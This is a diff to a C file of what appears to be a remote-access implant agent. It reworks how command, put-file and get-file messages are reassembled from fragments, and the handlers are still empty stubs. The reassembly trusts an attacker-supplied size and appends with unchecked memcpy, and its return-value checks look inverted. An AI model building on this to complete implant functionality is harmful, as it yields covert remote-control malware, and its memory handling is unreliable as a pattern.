@@ -4,95 +4,125 @@
 #include <string.h>
 
 #include "queue.h"
+#include "implant.h"
+#include "utility.h"
+#include "agent_message_handler.h"
 
 // Globals
-extern Queue* receive_queue;
-extern pthread_mutex_t receive_queue_lock;
-extern Queue* send_queue;
-extern pthread_mutex_t send_queue_lock;
+extern Queue* agent_receive_queue;
+extern pthread_mutex_t agent_receive_queue_lock;
+extern Queue* agent_send_queue;
+extern pthread_mutex_t agent_send_queue_lock;
 
-static int agent_handle_command(void){
+STATIC int agent_handle_command(void){
 	return 0;
 }
 
-static int agent_handle_put_file(void){
+STATIC int agent_handle_put_file(void){
 	return 0;
 }
 
-static int agent_handle_get_file(void){
+STATIC int agent_handle_get_file(void){
 	return 0;
 }
+
+STATIC int parse_first_fragment(Queue_Message* q_message, Assembled_Message* a_message){
+	Fragment* fragment = q_message->fragment;
+	
+	// check if we are receiving the first index of a message
+	if (fragment->index != 0){
+		return RET_ERROR;
+	}
+	a_message->last_fragment_index = fragment->index;
+	
+	// assign type
+	a_message->type = fragment->type;
+	
+	// get payload size
+	a_message->total_message_size = fragment->first_payload.total_size;
+	
+	// allocate memory and null
+	a_message->complete_message = malloc(a_message->total_message_size);
+	memset(a_message->complete_message, 0, a_message->total_message_size);
+	
+	// get the size of payload in this fragment
+	int this_payload_size = q_message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
+	
+	// copy payload (not including total message size) to message buffer
+	memcpy(a_message->complete_message, fragment->first_payload.actual_payload, this_payload_size);
+	
+	// record current size of message
+	a_message->current_message_size = this_payload_size;
+	
+	debug_print("first message:\t total_size: %d, current_message_size: %d, type: %d\n", a_message->total_message_size, a_message->current_message_size, a_message->type);
+	return RET_OK;
+}
+
+STATIC int parse_next_fragment(Queue_Message* q_message, Assembled_Message* a_message){
+	Fragment* fragment = q_message->fragment;
+	
+	// check if we are receiving the next expected index of a message
+	if (fragment->index != a_message->last_fragment_index + 1 || fragment->type != a_message->type){
+		a_message->last_fragment_index = -1;
+		return RET_ERROR;
+	}
+	a_message->last_fragment_index = fragment->index;
+	
+	// get the size of payload in this fragment
+	int this_payload_size = q_message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index);
+	
+	// copy payload to end of message buffer
+	memcpy(a_message->complete_message + a_message->current_message_size, fragment->next_payload, this_payload_size);
+	
+	// update current size of message
+	a_message->current_message_size += this_payload_size;
+	
+	debug_print("next message:\tcurrent_message_size: %d, type: %d\n", a_message->current_message_size, a_message->type);
+	return RET_OK;
+}
+
 
 void* agent_handle_message(void*){
 	Queue_Message* message;
 	Fragment* fragment;
+	Assembled_Message assembled_message = {0};
 	
-	int type = 0;
-	int last_fragment_index = -1;
-	int total_message_size = 0;
-	int current_message_size = 0;
-	char* complete_message;
+	assembled_message.last_fragment_index = -1;
 	
-	for (;;){
-		if (isEmpty(receive_queue))
-			continue;
-		
-		pthread_mutex_lock(&receive_queue_lock);
-		message = dequeue(receive_queue);
-		pthread_mutex_unlock(&receive_queue_lock);
+	for (;;){		
+		if (!(message = dequeue(agent_receive_queue, &agent_receive_queue_lock))) continue;;
 		
 		fragment = message->fragment;
-		if (last_fragment_index == -1 && fragment->index == 0){
-			// get payload size
-			total_message_size = (fragment->payload[0] && 0xFF) << 24;
-			total_message_size += (fragment->payload[1] && 0xFF) << 16;
-			total_message_size += (fragment->payload[2] && 0xFF) << 8;
-			total_message_size += fragment->payload[3] && 0xFF;
+		if (assembled_message.last_fragment_index == -1){
 			
-			// set last fragment index
-			last_fragment_index = 0;
-			
-			// allocate memory and null
-			complete_message = malloc(total_message_size);
-			memset(complete_message, 0, total_message_size);
-			
-			int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(total_message_size);
-			
-			// copy payload (not including total message size) to message buffer
-			memcpy(complete_message, fragment->payload + sizeof(total_message_size), this_payload_size);
-			
-			// record current size of message
-			current_message_size = this_payload_size;
-			type = fragment->type;
-			
-			printf("DEBUG first message:\t current_message_size: %d, type: %d", current_message_size, fragment->type);
-		}
-		else if (last_fragment_index == fragment->index - 1 && type == fragment->type){
-			int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index);
-			
-			// copy payload to end of message buffer
-			memcpy(complete_message, fragment->payload, this_payload_size);
-			
-			// update current size of message
-			current_message_size += this_payload_size;
-			
-			printf("DEBUG next message:\tcurrent_message_size: %d, type: %d", current_message_size, fragment->type);
+			int retval = parse_first_fragment(message, &assembled_message);
+			if (!retval){
+				printf("ERROR message order\n");
+				exit(RET_ERROR);
+			}
 		}
 		else{
-			printf("error message order\n");
-			exit(-1);
+			int retval = parse_next_fragment(message, &assembled_message);
+			if (!retval){
+				printf("ERROR message order\n");
+				exit(RET_ERROR);
+			}
 		}
 		
-		if (total_message_size == current_message_size){
-			last_fragment_index = -1;
-			if (type == TYPE_COMMAND){
+		if (assembled_message.total_message_size == assembled_message.current_message_size){
+			assembled_message.last_fragment_index = -1;
+			if (assembled_message.type == TYPE_COMMAND){
 				agent_handle_command();
 			}
-			if (type == TYPE_PUT_FILE){
+			else if (assembled_message.type == TYPE_PUT_FILE){
 				agent_handle_put_file();
 			}
-			if (type == TYPE_GET_FILE){
+			else if (assembled_message.type == TYPE_GET_FILE){
 				agent_handle_get_file();
+			}
+			else{
+				printf("ERROR unknown fragment type\n");
+				exit(-1);
 			}
 		}
 	}
